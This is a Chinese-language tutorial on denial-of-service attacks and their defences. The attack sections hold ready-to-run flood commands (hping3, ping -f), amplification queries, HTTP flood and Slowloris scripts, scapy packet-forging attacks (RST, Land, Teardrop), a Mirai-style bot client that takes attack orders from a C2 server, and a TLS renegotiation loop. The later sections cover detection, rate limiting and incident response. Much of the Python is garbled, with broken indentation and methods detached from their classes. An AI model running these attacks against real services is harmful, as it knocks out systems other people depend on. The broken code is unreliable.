# 拒绝服务（DoS/DDoS）攻击

## 1. 拒绝服务攻击概述

### 1.1 基本概念

拒绝服务攻击是通过耗尽目标系统的资源（网络带宽、计算能力、内存、磁盘空间等），使其无法提供正常服务的攻击方式。DDoS是分布式拒绝服务攻击，利用多个攻击源同时发动攻击。

### 1.2 攻击目标

- **网络带宽**：耗尽目标网络的出口/入口带宽

- **系统资源**：耗尽CPU、内存、文件句柄等

- **应用资源**：耗尽数据库连接、应用线程池等

- **特定漏洞**：利用协议或应用漏洞导致服务崩溃

## 2. DoS/DDoS攻击分类

### 2.1 网络层攻击

#### 2.1.1 洪水攻击（Flood Attacks）

```bash
# SYN Flood - 利用TCP三次握手

hping3 -S --flood -V -p 80 target.com

# UDP Flood

hping3 --flood --rand-source --udp -p 53 target.com

# ICMP Flood (Ping Flood)

ping -f target.com 
```

#### 2.1.2 放大攻击（Amplification Attacks）

```bash
# DNS放大攻击

# 攻击者向DNS服务器发送小查询，返回大响应到目标

dig ANY isc.org @8.8.8.8 +edns=0 +bufsize=4096

# NTP放大攻击

# 利用NTP monlist命令

ntpdc -n -c monlist ntp.server.com

# SNMP放大攻击

# 利用SNMP GetBulk请求

snmpbulkget -v2c -c public target.com .1.3.6.1.2.1
```

### 2.2 应用层攻击

#### 2.2.1 HTTP洪水攻击

```python
import threading
import requests

class HTTPFlood:
 def __init__(self, target_url, num_threads=100):
 self.target_url = target_url
 self.num_threads = num_threads
 self.is_attacking = False

def send_requests(self):
    while self.is_attacking:
        try:
            # 发送各种类型的请求
            requests.get(self.target_url)
            requests.post(self.target_url, data={'data': 'x' * 1000})
            requests.head(self.target_url)
        except:
            pass

def start_attack(self):
    self.is_attacking = True
    threads = []

    for i in range(self.num_threads):
        t = threading.Thread(target=self.send_requests)
        threads.append(t)
        t.start()

    return threads

def stop_attack(self):
    self.is_attacking = False
```

#### 2.2.2 慢速攻击（Slowloris）

```python
import socket
import time

class Slowloris:
 def __init__(self, target, port=80):
 self.target = target
 self.port = port
 self.sockets = []

def create_socket(self):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((self.target, self.port))

    # 发送不完整的HTTP请求
    s.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
    self.sockets.append(s)

def keep_alive(self):
    for s in self.sockets:
        try:
            # 定期发送少量数据保持连接
            s.send(b"X-a: b\r\n")
        except:
            self.sockets.remove(s)
            self.create_socket()

def attack(self, num_sockets=200):
    print(f"Creating {num_sockets} sockets...")
    for _ in range(num_sockets):
        try:
            self.create_socket()
        except:
            pass

    while True:
        print(f"Keeping {len(self.sockets)} sockets alive...")
        self.keep_alive()
        time.sleep(15)
```

### 2.3 协议漏洞攻击

#### 2.3.1 TCP协议漏洞

```python
# TCP RST攻击 - 发送伪造的RST包断开合法连接

from scapy.all import *

def tcp_rst_attack(target_ip, target_port, source_ip, source_port):
 ip = IP(src=source_ip, dst=target_ip)
 tcp = TCP(sport=source_port, dport=target_port, flags="R", seq=12345)
 packet = ip/tcp
 send(packet)

# Land攻击 - 源IP和目标IP相同

def land_attack(target_ip, target_port):
 ip = IP(src=target_ip, dst=target_ip)
 tcp = TCP(sport=target_port, dport=target_port, flags="S")
 packet = ip/tcp
 send(packet)
```

#### 2.3.2 IP分片攻击

```python
Teardrop攻击 - 发送重叠的分片包

from scapy.all import *

def teardrop_attack(target_ip):
 # 第一个分片
 ip1 = IP(dst=target_ip, flags="MF", frag=0)
 payload1 = "A" * 16
 packet1 = ip1/payload1

# 第二个分片，与第一个重叠
ip2 = IP(dst=target_ip, flags=0, frag=3)  # 重叠的偏移量
payload2 = "B" * 16
packet2 = ip2/payload2

send(packet1)
send(packet2) 
```

## 3. 新型DDoS攻击技术

### 3.1 物联网僵尸网络

```python
# 模拟Mirai类恶意软件

import socket
import threading

class IoTBot:
 def __init__(self, c2_server):
 self.c2_server = c2_server
 self.is_running = True

def connect_to_c2(self):
    # 连接到C2服务
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.socket.connect((self.c2_server, 6667))

    # 注册到僵尸网络
    self.socket.send(b"PASS pass\r\n")
    self.socket.send(b"NICK [bot]\r\n")
    self.socket.send(b"USER user user user :user\r\n")

def wait_for_commands(self):
    while self.is_running:
        data = self.socket.recv(1024)
        if b"!attack" in data:
            # 解析攻击命令并执行
            self.parse_attack_command(data)

def parse_attack_command(self, command):
    # 解析C2下发的攻击指令
    if b"syn" in command:
        self.launch_syn_flood()
    elif b"udp" in command:
        self.launch_udp_flood()
    elif b"http" in command:
        self.launch_http_flood()
```

### 3.2 应用层高级攻击

#### 3.2.1 HTTP/2 Rapid Reset

```http
# HTTP/2 Rapid Reset攻击
# 快速建立和重置大量HTTP/2流
:method: GET
:path: /
:authority: target.com
:scheme: https
RST_STREAM: 1  # 立即重置流
```

#### 3.2.2 加密攻击

```python
TLS/SSL重新协商攻击

import ssl
import socket

def ssl_renegotiation_attack(target, port=443):
 context = ssl.create_default_context()
 conn = context.wrap_socket(socket.socket(), server_hostname=target)
 conn.connect((target, port))

# 反复进行SSL重新协商
for i in range(1000):
    try:
        conn.renegotiate()  # 消耗服务器CPU
    except:
        break
```

## 4. 检测和监控

### 4.1 网络流量监控

#### 4.1.1 实时流量分析

```python
import psutil
import time
from collections import defaultdict

class DDoSDetector:
 def __init__(self, threshold_packets=1000, threshold_connections=100):
 self.threshold_packets = threshold_packets
 self.threshold_connections = threshold_connections
 self.packet_counts = defaultdict(int)
 self.connection_counts = defaultdict(int)

def monitor_network(self):
    while True:
        # 获取网络连接统计
        connections = psutil.net_connections()
        packets = psutil.net_io_counters(pernic=True)

        # 分析连接数
        self.analyze_connections(connections)

        # 分析包速率
        self.analyze_packets(packets)

        time.sleep(1)

def analyze_connections(self, connections):
    ip_counts = defaultdict(int)
    for conn in connections:
        if conn.raddr:
            ip_counts[conn.raddr.ip] += 1

    for ip, count in ip_counts.items():
        if count > self.threshold_connections:
            print(f"DDoS Alert: {ip} has {count} connections")
            self.block_ip(ip)

def analyze_packets(self, packets):
    for interface, stats in packets.items():
        packets_per_sec = stats.packets_sent + stats.packets_recv
        if packets_per_sec > self.threshold_packets:
            print(f"DDoS Alert: {interface} has {packets_per_sec} packets/sec")

def block_ip(self, ip):
    # 使用iptables阻塞IP
    import subprocess
    subprocess.run(['iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'])
```

#### 4.1.2 NetFlow/sFlow分析

```python
import pandas as pd
from sklearn.ensemble import IsolationForest

class FlowAnalyzer:
 def __init__(self):
 self.model = IsolationForest(contamination=0.1)
 self.flow_data = []

def process_flow(self, flow):
    """处理网络流数据"""
    features = [
        flow['packet_count'],
        flow['byte_count'], 
        flow['duration'],
        flow['packets_per_second'],
        len(flow['src_ip'])  # 简单特征工程
    ]

    self.flow_data.append(features)

    if len(self.flow_data) > 100:
        self.detect_anomalies()

def detect_anomalies(self):
    """使用机器学习检测异常流量"""
    df = pd.DataFrame(self.flow_data)
    predictions = self.model.fit_predict(df)

    anomalies = df[predictions == -1]
    if len(anomalies) > 0:
        print(f"检测到 {len(anomalies)} 个异常流")
        self.alert_security_team(anomalies)
```

### 4.2 应用性能监控

#### 4.2.1 资源使用监控

```python
import psutil
import time

class ResourceMonitor:
 def __init__(self, cpu_threshold=80, memory_threshold=85, connection_threshold=1000):
 self.cpu_threshold = cpu_threshold
 self.memory_threshold = memory_threshold
 self.connection_threshold = connection_threshold

def monitor_resources(self):
    while True:
        # CPU使用率
        cpu_percent = psutil.cpu_percent(interval=1)

        # 内存使用率
        memory = psutil.virtual_memory()

        # 网络连接数
        connections = len(psutil.net_connections())

        # 检查阈值
        if cpu_percent > self.cpu_threshold:
            self.alert(f"High CPU usage: {cpu_percent}%")

        if memory.percent > self.memory_threshold:
            self.alert(f"High memory usage: {memory.percent}%")

        if connections > self.connection_threshold:
            self.alert(f"High connection count: {connections}")

        time.sleep(5)

def alert(self, message):
    print(f"DDoS Alert: {message}")
    # 发送警报到监控系统
```

## 5. 防御措施

### 5.1 网络层防御

#### 5.1.1 流量清洗和速率限制

```bash
# 使用iptables进行基础防护

# 限制ICMP包速率

iptables -A INPUT -p icmp -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp -j DROP

# 限制SYN包速率

iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# 限制单个IP的连接数

iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 -j DROP

# 使用ipset管理黑名单

ipset create blacklist hash:ip
iptables -I INPUT -m set --match-set blacklist src -j DROP 
```

#### 5.1.2 BGP FlowSpec

```bash
# 使用BGP FlowSpec发布防护规则

# 阻止特定IP范围的UDP流量

flow-rule {
 match {
 source 192.168.0.0/24;
 destination 10.0.0.1/32;
 protocol udp;
 port 53;
 }
 then {
 discard;
 }
}
```

### 5.2 系统层防御

#### 5.2.1 内核参数调优

```bash
/etc/sysctl.conf - DDoS防护配置

# 启用SYN Cookie

net.ipv4.tcp_syncookies = 1

# SYN队列大小

net.ipv4.tcp_max_syn_backlog = 2048

# 减少SYN+ACK重试次数

net.ipv4.tcp_synack_retries = 2

# 启用TCP时间戳

net.ipv4.tcp_timestamps = 1

# 快速回收TIME_WAIT连接

net.ipv4.tcp_tw_recycle = 1
net.ipv4.tcp_tw_reuse = 1

# 最大连接数

net.core.somaxconn = 65535

# 最大待处理包队列

net.core.netdev_max_backlog = 10000
```

#### 5.2.2 系统资源限制

```bash
# 限制进程资源

ulimit -n 65535 # 文件描述符
ulimit -u 65535 # 用户进程数

# 使用cgroups限制资源

cgcreate -g cpu,memory:/app_group
cgset -r cpu.shares=512 app_group
cgset -r memory.limit_in_bytes=1G app_group
```

### 5.3 应用层防御

#### 5.3.1 Web应用防火墙配置

```nginx
Nginx DDoS防护配置

http {
 # 限制请求速率
 limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
 limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;

# 限制连接数
limit_conn_zone $binary_remote_addr zone=addr:10m;

server {
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        limit_conn addr 10;
    }

    location /login {
        limit_req zone=login burst=5 nodelay;
    }

    # 静态资源缓存
    location ~* \.(jpg|jpeg|png|gif|css|js)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
}

}
```

#### 5.3.2 应用级速率限制

```python
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
app = Flask(__name__)
limiter = Limiter(
 app,
 key_func=get_remote_address,
 default_limits=["200 per day", "50 per hour"]
)

@app.route('/api/data')
@limiter.limit("10 per minute")
def get_data():
 return jsonify({"data": "sensitive_data"})

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
 # 登录逻辑
 return jsonify({"status": "success"})

# 自定义限制策略

def custom_limit():
 # 基于用户行为动态调整限制
 user_agent = request.headers.get('User-Agent', '')
 if 'bot' in user_agent.lower():
 return "1 per minute"
 return "10 per minute"

@app.route('/search')
@limiter.limit(custom_limit)
def search():
 return jsonify({"results": []})
```

### 5.4 云服务和CDN防护

#### 5.4.1 AWS Shield + WAF

```python
import boto3

class AWSDDoSProtection:
 def __init__(self):
 self.waf = boto3.client('wafv2')
 self.shield = boto3.client('shield')

def create_protection(self, resource_arn):
    # 启用AWS Shield Advanced
    response = self.shield.create_protection(
        Name='web-application-protection',
        ResourceArn=resource_arn
    )

    # 配置WAF规则
    self.create_waf_rules()

def create_waf_rules(self):
    # IP速率限制规则
    self.waf.update_web_acl(
        Name='DDoS-Protection-WebACL',
        Rules=[
            {
                'Name': 'RateLimitRule',
                'Priority': 1,
                'Statement': {
                    'RateBasedStatement': {
                        'Limit': 2000,
                        'AggregateKeyType': 'IP'
                    }
                },
                'Action': {'Block': {}},
                'VisibilityConfig': {
                    'SampledRequestsEnabled': True,
                    'CloudWatchMetricsEnabled': True,
                    'MetricName': 'RateLimitRule'
                }
            }
        ]
    )
```

#### 5.4.2 Cloudflare防护配置

```javascript
// Cloudflare Workers进行DDoS防护
addEventListener('fetch', event => {
 event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
 const clientIP = request.headers.get('cf-connecting-ip')
 const userAgent = request.headers.get('user-agent')

// 检查请求速率
const token = request.cf?.botManagement?.score
if (token < 30) {
    // 可能是恶意机器人
    return new Response('Access denied', { status: 403 })
}

// 基于国家/地区限制
const country = request.cf?.country
if (['CN', 'RU', 'KP'].includes(country)) {
    // 限制特定国家的访问
    return new Response('Region blocked', { status: 403 })
}

// 正常处理请求
return fetch(request)

}
```

## 6. 架构层防护

### 6.1 负载均衡和自动扩展

```yaml
Kubernetes HPA配置

apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
 name: web-application
spec:
 scaleTargetRef:
 apiVersion: apps/v1
 kind: Deployment
 name: web-app
 minReplicas: 3
 maxReplicas: 50
 metrics:

- type: Resource
  resource:
   name: cpu
   target:
type: Utilization
 averageUtilization: 70

behavior:
scaleDown:
 stabilizationWindowSeconds: 300
 policies:
- type: Percent
  value: 50
  periodSeconds: 60
```

### 6.2 微服务熔断和降级

```java
// 使用Resilience4j实现熔断
@CircuitBreaker(name = "userService", fallbackMethod = "fallback")
@RateLimiter(name = "userService")
@Bulkhead(name = "userService")
public User getUser(String userId) {
 return userService.getUser(userId);
}

public User fallback(String userId, Exception e) {
 // 返回降级数据
 return new User("default", "Default User");
}

// Hystrix配置
hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=5000
hystrix.command.default.circuitBreaker.requestVolumeThreshold=20
hystrix.command.default.circuitBreaker.errorThresholdPercentage=50
```

### 6.3 边缘计算防护

```python
使用边缘节点进行初步过滤

from flask import Flask, request, abort
import redis
app = Flask(__name__)
redis_client = redis.Redis(host='localhost', port=6379, db=0)

@app.before_request
def rate_limit():
 client_ip = request.remote_addr
 key = f"rate_limit:{client_ip}"

# 使用Redis进行速率限制
current = redis_client.incr(key)
if current == 1:
    redis_client.expire(key, 60)  # 设置过期时间

if current > 100:  # 每分钟最多100个请求
    abort(429, "Too Many Requests")

# 检查User-Agent
user_agent = request.headers.get('User-Agent', '')
if not user_agent or len(user_agent) < 10:
    abort(400, "Invalid User-Agent")
```

## 7. 应急响应

### 7.1 DDoS攻击检测和响应

```python
class DDoSResponse:
 def __init__(self):
 self.mitigation_strategies = {
 'syn_flood': self.mitigate_syn_flood,
 'http_flood': self.mitigate_http_flood,
 'dns_amplification': self.mitigate_dns_amplification
 }

def detect_and_respond(self, attack_type, target):
 print(f"检测到 {attack_type} 攻击，目标: {target}")

# 执行缓解策略
if attack_type in self.mitigation_strategies:
    self.mitigation_strategies[attack_type](target)

# 通知相关人员
self.notify_team(attack_type, target)

# 记录攻击信息
self.log_attack(attack_type, target)

def mitigate_syn_flood(self, target):
 print("启用SYN Cookie防护")
 # 启用SYN Cookie
 subprocess.run(['sysctl', '-w', 'net.ipv4.tcp_syncookies=1'])


# 调整SYN队列大小
subprocess.run(['sysctl', '-w', 'net.ipv4.tcp_max_syn_backlog=2048'])

def mitigate_http_flood(self, target):
 print("启用HTTP请求限制")
 # 限制单个IP的连接数
 subprocess.run(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '80', 
'-m', 'connlimit', '--connlimit-above', '50', '-j', 'DROP'])

def mitigate_dns_amplification(self, target):
 print("阻止DNS放大攻击")
 # 阻止外部DNS查询
 subprocess.run(['iptables', '-A', 'INPUT', '-p', 'udp', '--dport', '53', 
'-j', 'DROP'])

def notify_team(self, attack_type, target):
 # 发送警报邮件
 subject = f"DDoS攻击警报: {attack_type}"
 body = f"""
 检测到DDoS攻击:
 类型: {attack_type}
 目标: {target}
 时间: {datetime.now()}
 已启动自动防护措施。
 """

# 发送邮件逻辑
self.send_email(subject, body)

def log_attack(self, attack_type, target):
 with open('/var/log/ddos_attacks.log', 'a') as f:
 f.write(f"{datetime.now()} - {attack_type} - {target}\n")
```

### 7.2 自动扩展和故障转移

```python
import boto3

class AutoScalingResponse:
 def **init**(self):
 self.autoscaling = boto3.client('autoscaling')
 self.elb = boto3.client('elbv2')

def handle_traffic_spike(self):
 # 检测到流量激增，自动扩展
 response = self.autoscaling.set_desired_capacity(
 AutoScalingGroupName='web-server-group',
 DesiredCapacity=20, # 扩展到20个实例
 HonorCooldown=False
 )
#更新负载均衡器配置

self.update_load_balancer()

def update_load_balancer(self):

# 调整负载均衡器超时时间

self.elb.modify_load_balancer_attributes(
 LoadBalancerArn='arn:aws:elasticloadbalancing:...',
 Attributes=[
 {
 'Key': 'idle_timeout.timeout_seconds',
 'Value': '30'
 }
 ]
 ) 
```

## 8. 测试和演练

### 8.1 DDoS压力测试

```python
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor

class DDoSTest:
    def __init__(self, target_url, num_requests=1000, concurrency=100):
        self.target_url = target_url
        self.num_requests = num_requests
        self.concurrency = concurrency

    async def send_request(self, session):
        try:
            async with session.get(self.target_url) as response:
                return await response.text()
        except:
            return None

    async def run_test(self):
        connector = aiohttp.TCPConnector(limit=self.concurrency)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for i in range(self.num_requests):
                task = asyncio.create_task(self.send_request(session))
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            successful = len([r for r in results if r is not None])
            print(f"成功请求: {successful}/{self.num_requests}")

    def test_protection(self):
        # 运行压力测试
        asyncio.run(self.run_test())
```

### 8.2 防护演练脚本

```bash
#!/bin/bash

# DDoS防护演练脚本

echo "开始DDoS防护演练..."

# 1. 模拟SYN Flood攻击

echo "模拟SYN Flood攻击"
hping3 -S -p 80 --flood --rand-source $TARGET_IP &

# 2. 监控系统资源

echo "监控系统资源..."
top -b -d 1 -n 60 > resource_usage.log &

# 3. 检查防护措施是否生效

echo "检查防护措施..."
iptables -L -n | grep DROP

# 4. 测试自动扩展

echo "测试自动扩展..."
aws autoscaling set-desired-capacity \
 --auto-scaling-group-name web-asg \
 --desired-capacity 10

# 5. 清理测试

echo "清理测试环境..."
pkill hping3
```

## 9. 最佳实践总结

### 9.1 防御策略层次

```yaml
ddos_protection_strategy:
 network_layer:
 - bgp_flowspec: true
 - rate_limiting: true
 - syn_cookie: true
 - ip_blacklisting: true

transport_layer:
 - connection_limits: true
 - timeout_optimization: true
 - tcp_stack_tuning: true

application_layer:
 - waf_protection: true
 - request_rate_limiting: true
 - bot_detection: true
 - caching_strategy: true

architectural:
 - load_balancing: true
 - auto_scaling: true
 - cdn_protection: true
 - geographic_distribution: true

monitoring:
 - real_time_alerting: true
 - traffic_analysis: true
 - performance_metrics: true
 - log_analysis: true
```

### 9.2 持续改进流程

```python
class DDoSImprovement:
 def analyze_attack_patterns(self):
 """分析攻击模式并改进防护"""
 # 从日志中分析攻击特征
 attacks = self.parse_attack_logs()
    for attack in attacks:
        # 更新防护规则
        self.update_protection_rules(attack)

        # 调整阈值
        self.adjust_thresholds(attack)

def update_protection_rules(self, attack):
    """根据攻击特征更新防护规则"""
    if attack['type'] == 'http_flood':
        # 加强HTTP请求限制
        self.update_waf_rules(attack)

    elif attack['type'] == 'syn_flood':
        # 调整TCP参数
        self.update_tcp_settings(attack)

def conduct_regular_testing(self):
    """定期进行防护测试"""
    # 每月进行一次压力测试
    test = DDoSTest('https://example.com')
    test.test_protection()

    # 验证防护措施有效性
    self.validate_mitigation()
```
